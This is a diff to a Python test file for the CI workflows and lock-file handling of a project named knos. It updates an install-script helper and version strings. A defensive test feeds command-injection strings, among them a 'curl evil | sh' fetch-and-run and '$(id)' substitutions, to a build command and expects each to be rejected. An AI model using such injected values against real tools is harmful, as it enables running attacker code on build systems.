@@ -112,6 +112,11 @@ def _mine() -> list[Path]:
 
 def _install(name: str, job: str) -> str:
     """The one script that installs knos in a job of the three called workflows."""
+    if (name, job) == ("prove.yml", "settle"):     # the lock goes to a file, and PyPI is waited for first (tests/test_pypi_wait.py)
+        run = next(str(s["run"]) for s in _steps(_jobs(name)[job]) if "--require-hashes" in str(s.get("run") or ""))
+        wait = run[run.index("python3 -I - "):run.index("\nWAIT\n") + 6]
+        return LOCKED_INSTALL.replace("uv pip install", 'cat > "$RUNNER_TEMP/knos.lock" <<\'LOCK\'\nKNOS_LOCK\nLOCK\n' + wait + "uv pip install", 1).replace(
+            "-r - <<'LOCK'\nKNOS_LOCK\nLOCK\n", '-r "$RUNNER_TEMP/knos.lock"\n')
     if (name, job) in LOCKED:
         return LOCKED_INSTALL
     return (JUDGE_INSTALL if job == "judge" else INSTALL).format(release=_release())
@@ -270,7 +275,7 @@ def test_a_token_is_asked_for_only_by_jobs_that_run_no_pull_request_code_and_che
         # uv, the install, the command: no checkout, no git, no artifact, nothing a pull request wrote
         # (and, where a verdict comes from a job that ran such code, the step that reads it as data before the command)
         assert [s["uses"].split("@")[0] for s in steps if "uses" in s] == ["astral-sh/setup-uv"], (name, job)
-        assert _scripts(_jobs(name)[job]) == [LOCKED_INSTALL, *([GATE[name, job]] if (name, job) in GATE else []),
+        assert _scripts(_jobs(name)[job]) == [_install(name, job), *([GATE[name, job]] if (name, job) in GATE else []),
                                               {**COMMAND, (ATTEST, "attest"): ATTEST_COMMAND}[name, job]], (name, job)
     # in a calling file such a job is a call to a pinned workflow and nothing else
     for path in _mine():
@@ -1495,7 +1500,7 @@ def test_the_lock_is_for_the_release_the_workflows_name_and_holds_the_wheel_and_
     good = lock.read_text(encoding="utf-8")
     last = good.splitlines()[-1]
     for wrong in (good.replace(last, ""), good + "typer==0.0.1 --hash=sha256:" + "0" * 64 + "\n", good.replace(last, last[:-1]),
-                  good.replace(last, last.replace(_release(), "9.9.9")), good.replace("solders==", "solderz=="), "knos==0.3.22 --hash=sha256:" + "a" * 64 + "\n"):
+                  good.replace(last, last.replace(_release(), "9.9.9")), good.replace("solders==", "solderz=="), "knos==0.3.23 --hash=sha256:" + "a" * 64 + "\n"):
         bad = tmp_path / "bad.txt"
         bad.write_text(wrong, encoding="utf-8")
         with pytest.raises(SystemExit, match="the lock is not"):
@@ -1532,7 +1537,7 @@ def test_a_rehearsal_variant_differs_in_how_knos_is_installed_and_in_nothing_els
             pub.main(["check", str(out)])                  # a checkout is checked against the set it was made as, named
     assert pub.main(["check", str(out), "--lock", str(_lock(tmp_path, pub))]) == 1
     capsys.readouterr()
-    for bad in ('knos"; curl evil | sh; "', "knos==0.3.22 # x", "$(id)", "knos\nrun: x", "a: b", "`id`", ""):
+    for bad in ('knos"; curl evil | sh; "', "knos==0.3.23 # x", "$(id)", "knos\nrun: x", "a: b", "`id`", ""):
         with pytest.raises(SystemExit):
             pub.main(["build", str(tmp_path / "bad"), "--source", bad])
     assert not (tmp_path / "bad").exists()
